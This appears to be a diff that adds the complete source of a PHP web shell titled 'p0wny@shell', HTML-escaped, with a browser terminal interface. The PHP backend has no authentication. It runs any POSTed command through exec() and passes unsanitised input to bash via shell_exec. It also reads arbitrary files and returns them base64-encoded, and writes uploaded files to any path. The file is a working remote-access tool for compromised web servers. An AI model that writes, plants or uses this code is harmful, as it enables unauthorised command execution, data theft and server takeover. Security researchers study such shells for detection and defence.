@@ -1,0 +1,504 @@
+a
+&lt;?php
+
+function featureShell($cmd, $cwd) {
+    $stdout = array();
+
+    if (preg_match(&quot;/^\s*cd\s*$/&quot;, $cmd)) {
+        // pass
+    } elseif (preg_match(&quot;/^\s*cd\s+(.+)\s*(2&gt;&amp;1)?$/&quot;, $cmd)) {
+        chdir($cwd);
+        preg_match(&quot;/^\s*cd\s+([^\s]+)\s*(2&gt;&amp;1)?$/&quot;, $cmd, $match);
+        chdir($match[1]);
+    } elseif (preg_match(&quot;/^\s*download\s+[^\s]+\s*(2&gt;&amp;1)?$/&quot;, $cmd)) {
+        chdir($cwd);
+        preg_match(&quot;/^\s*download\s+([^\s]+)\s*(2&gt;&amp;1)?$/&quot;, $cmd, $match);
+        return featureDownload($match[1]);
+    } else {
+        chdir($cwd);
+        exec($cmd, $stdout);
+    }
+
+    return array(
+        &quot;stdout&quot; =&gt; $stdout,
+        &quot;cwd&quot; =&gt; getcwd()
+    );
+}
+
+function featurePwd() {
+    return array(&quot;cwd&quot; =&gt; getcwd());
+}
+
+function featureHint($fileName, $cwd, $type) {
+    chdir($cwd);
+    if ($type == &#039;cmd&#039;) {
+        $cmd = &quot;compgen -c $fileName&quot;;
+    } else {
+        $cmd = &quot;compgen -f $fileName&quot;;
+    }
+    $cmd = &quot;/bin/bash -c \&quot;$cmd\&quot;&quot;;
+    $files = explode(&quot;\n&quot;, shell_exec($cmd));
+    return array(
+        &#039;files&#039; =&gt; $files,
+    );
+}
+
+function featureDownload($filePath) {
+    $file = @file_get_contents($filePath);
+    if ($file === FALSE) {
+        return array(
+            &#039;stdout&#039; =&gt; array(&#039;File not found / no read permission.&#039;),
+            &#039;cwd&#039; =&gt; getcwd()
+        );
+    } else {
+        return array(
+            &#039;name&#039; =&gt; basename($filePath),
+            &#039;file&#039; =&gt; base64_encode($file)
+        );
+    }
+}
+
+function featureUpload($path, $file, $cwd) {
+    chdir($cwd);
+    $f = @fopen($path, &#039;wb&#039;);
+    if ($f === FALSE) {
+        return array(
+            &#039;stdout&#039; =&gt; array(&#039;Invalid path / no write permission.&#039;),
+            &#039;cwd&#039; =&gt; getcwd()
+        );
+    } else {
+        fwrite($f, base64_decode($file));
+        fclose($f);
+        return array(
+            &#039;stdout&#039; =&gt; array(&#039;Done.&#039;),
+            &#039;cwd&#039; =&gt; getcwd()
+        );
+    }
+}
+
+if (isset($_GET[&quot;feature&quot;])) {
+
+    $response = NULL;
+
+    switch ($_GET[&quot;feature&quot;]) {
+        case &quot;shell&quot;:
+            $cmd = $_POST[&#039;cmd&#039;];
+            if (!preg_match(&#039;/2&gt;/&#039;, $cmd)) {
+                $cmd .= &#039; 2&gt;&amp;1&#039;;
+            }
+            $response = featureShell($cmd, $_POST[&quot;cwd&quot;]);
+            break;
+        case &quot;pwd&quot;:
+            $response = featurePwd();
+            break;
+        case &quot;hint&quot;:
+            $response = featureHint($_POST[&#039;filename&#039;], $_POST[&#039;cwd&#039;], $_POST[&#039;type&#039;]);
+            break;
+        case &#039;upload&#039;:
+            $response = featureUpload($_POST[&#039;path&#039;], $_POST[&#039;file&#039;], $_POST[&#039;cwd&#039;]);
+    }
+
+    header(&quot;Content-Type: application/json&quot;);
+    echo json_encode($response);
+    die();
+}
+
+?&gt;&lt;!DOCTYPE html&gt;
+
+&lt;html&gt;
+
+    &lt;head&gt;
+        &lt;meta charset=&quot;UTF-8&quot; /&gt;
+        &lt;title&gt;p0wny@shell:~#&lt;/title&gt;
+        &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot; /&gt;
+        &lt;style&gt;
+            html, body {
+                margin: 0;
+                padding: 0;
+                background: #333;
+                color: #eee;
+                font-family: monospace;
+            }
+
+            *::-webkit-scrollbar-track {
+                border-radius: 8px;
+                background-color: #353535;
+            }
+
+            *::-webkit-scrollbar {
+                width: 8px;
+                height: 8px;
+            }
+
+            *::-webkit-scrollbar-thumb {
+                border-radius: 8px;
+                -webkit-box-shadow: inset 0 0 6px rgba(0,0,0,.3);
+                background-color: #bcbcbc;
+            }
+
+            #shell {
+                background: #222;
+                max-width: 800px;
+                margin: 50px auto 0 auto;
+                box-shadow: 0 0 5px rgba(0, 0, 0, .3);
+                font-size: 10pt;
+                display: flex;
+                flex-direction: column;
+                align-items: stretch;
+            }
+
+            #shell-content {
+                height: 500px;
+                overflow: auto;
+                padding: 5px;
+                white-space: pre-wrap;
+                flex-grow: 1;
+            }
+
+            #shell-logo {
+                font-weight: bold;
+                color: #FF4180;
+                text-align: center;
+            }
+
+            @media (max-width: 991px) {
+                #shell-logo {
+                    font-size: 6px;
+                    margin: -25px 0;
+                }
+
+                html, body, #shell {
+                    height: 100%;
+                    width: 100%;
+                    max-width: none;
+                }
+
+                #shell {
+                    margin-top: 0;
+                }
+            }
+
+            @media (max-width: 767px) {
+                #shell-input {
+                    flex-direction: column;
+                }
+            }
+
+            @media (max-width: 320px) {
+                #shell-logo {
+                    font-size: 5px;
+                }
+            }
+
+            .shell-prompt {
+                font-weight: bold;
+                color: #75DF0B;
+            }
+
+            .shell-prompt &gt; span {
+                color: #1BC9E7;
+            }
+
+            #shell-input {
+                display: flex;
+                box-shadow: 0 -1px 0 rgba(0, 0, 0, .3);
+                border-top: rgba(255, 255, 255, .05) solid 1px;
+            }
+
+            #shell-input &gt; label {
+                flex-grow: 0;
+                display: block;
+                padding: 0 5px;
+                height: 30px;
+                line-height: 30px;
+            }
+
+            #shell-input #shell-cmd {
+                height: 30px;
+                line-height: 30px;
+                border: none;
+                background: transparent;
+                color: #eee;
+                font-family: monospace;
+                font-size: 10pt;
+                width: 100%;
+                align-self: center;
+            }
+
+            #shell-input div {
+                flex-grow: 1;
+                align-items: stretch;
+            }
+
+            #shell-input input {
+                outline: none;
+            }
+        &lt;/style&gt;
+
+        &lt;script&gt;
+            var CWD = null;
+            var commandHistory = [];
+            var historyPosition = 0;
+            var eShellCmdInput = null;
+            var eShellContent = null;
+
+            function _insertCommand(command) {
+                eShellContent.innerHTML += &quot;\n\n&quot;;
+                eShellContent.innerHTML += &#039;&lt;span class=\&quot;shell-prompt\&quot;&gt;&#039; + genPrompt(CWD) + &#039;&lt;/span&gt; &#039;;
+                eShellContent.innerHTML += escapeHtml(command);
+                eShellContent.innerHTML += &quot;\n&quot;;
+                eShellContent.scrollTop = eShellContent.scrollHeight;
+            }
+
+            function _insertStdout(stdout) {
+                eShellContent.innerHTML += escapeHtml(stdout);
+                eShellContent.scrollTop = eShellContent.scrollHeight;
+            }
+
+            function _defer(callback) {
+                setTimeout(callback, 0);
+            }
+
+            function featureShell(command) {
+
+                _insertCommand(command);
+                if (/^\s*upload\s+[^\s]+\s*$/.test(command)) {
+                    featureUpload(command.match(/^\s*upload\s+([^\s]+)\s*$/)[1]);
+                } else if (/^\s*clear\s*$/.test(command)) {
+                    // Backend shell TERM environment variable not set. Clear command history from UI but keep in buffer
+                    eShellContent.innerHTML = &#039;&#039;;
+                } else {
+                    makeRequest(&quot;?feature=shell&quot;, {cmd: command, cwd: CWD}, function (response) {
+                        if (response.hasOwnProperty(&#039;file&#039;)) {
+                            featureDownload(response.name, response.file)
+                        } else {
+                            _insertStdout(response.stdout.join(&quot;\n&quot;));
+                            updateCwd(response.cwd);
+                        }
+                    });
+                }
+            }
+
+            function featureHint() {
+                if (eShellCmdInput.value.trim().length === 0) return;  // field is empty -&gt; nothing to complete
+
+                function _requestCallback(data) {
+                    if (data.files.length &lt;= 1) return;  // no completion
+
+                    if (data.files.length === 2) {
+                        if (type === &#039;cmd&#039;) {
+                            eShellCmdInput.value = data.files[0];
+                        } else {
+                            var currentValue = eShellCmdInput.value;
+                            eShellCmdInput.value = currentValue.replace(/([^\s]*)$/, data.files[0]);
+                        }
+                    } else {
+                        _insertCommand(eShellCmdInput.value);
+                        _insertStdout(data.files.join(&quot;\n&quot;));
+                    }
+                }
+
+                var currentCmd = eShellCmdInput.value.split(&quot; &quot;);
+                var type = (currentCmd.length === 1) ? &quot;cmd&quot; : &quot;file&quot;;
+                var fileName = (type === &quot;cmd&quot;) ? currentCmd[0] : currentCmd[currentCmd.length - 1];
+
+                makeRequest(
+                    &quot;?feature=hint&quot;,
+                    {
+                        filename: fileName,
+                        cwd: CWD,
+                        type: type
+                    },
+                    _requestCallback
+                );
+
+            }
+
+            function featureDownload(name, file) {
+                var element = document.createElement(&#039;a&#039;);
+                element.setAttribute(&#039;href&#039;, &#039;data:application/octet-stream;base64,&#039; + file);
+                element.setAttribute(&#039;download&#039;, name);
+                element.style.display = &#039;none&#039;;
+                document.body.appendChild(element);
+                element.click();
+                document.body.removeChild(element);
+                _insertStdout(&#039;Done.&#039;);
+            }
+
+            function featureUpload(path) {
+                var element = document.createElement(&#039;input&#039;);
+                element.setAttribute(&#039;type&#039;, &#039;file&#039;);
+                element.style.display = &#039;none&#039;;
+                document.body.appendChild(element);
+                element.addEventListener(&#039;change&#039;, function () {
+                    var promise = getBase64(element.files[0]);
+                    promise.then(function (file) {
+                        makeRequest(&#039;?feature=upload&#039;, {path: path, file: file, cwd: CWD}, function (response) {
+                            _insertStdout(response.stdout.join(&quot;\n&quot;));
+                            updateCwd(response.cwd);
+                        });
+                    }, function () {
+                        _insertStdout(&#039;An unknown client-side error occurred.&#039;);
+                    });
+                });
+                element.click();
+                document.body.removeChild(element);
+            }
+
+            function getBase64(file, onLoadCallback) {
+                return new Promise(function(resolve, reject) {
+                    var reader = new FileReader();
+                    reader.onload = function() { resolve(reader.result.match(/base64,(.*)$/)[1]); };
+                    reader.onerror = reject;
+                    reader.readAsDataURL(file);
+                });
+            }
+
+            function genPrompt(cwd) {
+                cwd = cwd || &quot;~&quot;;
+                var shortCwd = cwd;
+                if (cwd.split(&quot;/&quot;).length &gt; 3) {
+                    var splittedCwd = cwd.split(&quot;/&quot;);
+                    shortCwd = &quot;…/&quot; + splittedCwd[splittedCwd.length-2] + &quot;/&quot; + splittedCwd[splittedCwd.length-1];
+                }
+                return &quot;p0wny@shell:&lt;span title=\&quot;&quot; + cwd + &quot;\&quot;&gt;&quot; + shortCwd + &quot;&lt;/span&gt;#&quot;;
+            }
+
+            function updateCwd(cwd) {
+                if (cwd) {
+                    CWD = cwd;
+                    _updatePrompt();
+                    return;
+                }
+                makeRequest(&quot;?feature=pwd&quot;, {}, function(response) {
+                    CWD = response.cwd;
+                    _updatePrompt();
+                });
+
+            }
+
+            function escapeHtml(string) {
+                return string
+                    .replace(/&amp;/g, &quot;&amp;&quot;)
+                    .replace(/&lt;/g, &quot;&lt;&quot;)
+                    .replace(/&gt;/g, &quot;&gt;&quot;);
+            }
+
+            function _updatePrompt() {
+                var eShellPrompt = document.getElementById(&quot;shell-prompt&quot;);
+                eShellPrompt.innerHTML = genPrompt(CWD);
+            }
+
+            function _onShellCmdKeyDown(event) {
+                switch (event.key) {
+                    case &quot;Enter&quot;:
+                        featureShell(eShellCmdInput.value);
+                        insertToHistory(eShellCmdInput.value);
+                        eShellCmdInput.value = &quot;&quot;;
+                        break;
+                    case &quot;ArrowUp&quot;:
+                        if (historyPosition &gt; 0) {
+                            historyPosition--;
+                            eShellCmdInput.blur();
+                            eShellCmdInput.value = commandHistory[historyPosition];
+                            _defer(function() {
+                                eShellCmdInput.focus();
+                            });
+                        }
+                        break;
+                    case &quot;ArrowDown&quot;:
+                        if (historyPosition &gt;= commandHistory.length) {
+                            break;
+                        }
+                        historyPosition++;
+                        if (historyPosition === commandHistory.length) {
+                            eShellCmdInput.value = &quot;&quot;;
+                        } else {
+                            eShellCmdInput.blur();
+                            eShellCmdInput.focus();
+                            eShellCmdInput.value = commandHistory[historyPosition];
+                        }
+                        break;
+                    case &#039;Tab&#039;:
+                        event.preventDefault();
+                        featureHint();
+                        break;
+                }
+            }
+
+            function insertToHistory(cmd) {
+                commandHistory.push(cmd);
+                historyPosition = commandHistory.length;
+            }
+
+            function makeRequest(url, params, callback) {
+                function getQueryString() {
+                    var a = [];
+                    for (var key in params) {
+                        if (params.hasOwnProperty(key)) {
+                            a.push(encodeURIComponent(key) + &quot;=&quot; + encodeURIComponent(params[key]));
+                        }
+                    }
+                    return a.join(&quot;&amp;&quot;);
+                }
+                var xhr = new XMLHttpRequest();
+                xhr.open(&quot;POST&quot;, url, true);
+                xhr.setRequestHeader(&quot;Content-Type&quot;, &quot;application/x-www-form-urlencoded&quot;);
+                xhr.onreadystatechange = function() {
+                    if (xhr.readyState === 4 &amp;&amp; xhr.status === 200) {
+                        try {
+                            var responseJson = JSON.parse(xhr.responseText);
+                            callback(responseJson);
+                        } catch (error) {
+                            alert(&quot;Error while parsing response: &quot; + error);
+                        }
+                    }
+                };
+                xhr.send(getQueryString());
+            }
+
+            document.onclick = function(event) {
+                event = event || window.event;
+                var selection = window.getSelection();
+                var target = event.target || event.srcElement;
+
+                if (target.tagName === &quot;SELECT&quot;) {
+                    return;
+                }
+
+                if (!selection.toString()) {
+                    eShellCmdInput.focus();
+                }
+            };
+
+            window.onload = function() {
+                eShellCmdInput = document.getElementById(&quot;shell-cmd&quot;);
+                eShellContent = document.getElementById(&quot;shell-content&quot;);
+                updateCwd();
+                eShellCmdInput.focus();
+            };
+        &lt;/script&gt;
+    &lt;/head&gt;
+
+    &lt;body&gt;
+        &lt;div id=&quot;shell&quot;&gt;
+            &lt;pre id=&quot;shell-content&quot;&gt;
+                &lt;div id=&quot;shell-logo&quot;&gt;
+        ___                         ____      _          _ _        _  _   &lt;span&gt;&lt;/span&gt;
+ _ __  / _ \__      ___ __  _   _  / __ \ ___| |__   ___| | |_ /\/|| || |_ &lt;span&gt;&lt;/span&gt;
+| &#039;_ \| | | \ \ /\ / / &#039;_ \| | | |/ / _` / __| &#039;_ \ / _ \ | (_)/\/_  ..  _|&lt;span&gt;&lt;/span&gt;
+| |_) | |_| |\ V  V /| | | | |_| | | (_| \__ \ | | |  __/ | |_   |_      _|&lt;span&gt;&lt;/span&gt;
+| .__/ \___/  \_/\_/ |_| |_|\__, |\ \__,_|___/_| |_|\___|_|_(_)    |_||_|  &lt;span&gt;&lt;/span&gt;
+|_|                         |___/  \____/                                  &lt;span&gt;&lt;/span&gt;
+                &lt;/div&gt;
+            &lt;/pre&gt;
+            &lt;div id=&quot;shell-input&quot;&gt;
+                &lt;label for=&quot;shell-cmd&quot; id=&quot;shell-prompt&quot; class=&quot;shell-prompt&quot;&gt;???&lt;/label&gt;
+                &lt;div&gt;
+                    &lt;input id=&quot;shell-cmd&quot; name=&quot;cmd&quot; onkeydown=&quot;_onShellCmdKeyDown(event)&quot;/&gt;
+                &lt;/div&gt;
+            &lt;/div&gt;
+        &lt;/div&gt;
+    &lt;/body&gt;
+
+&lt;/html&gt;
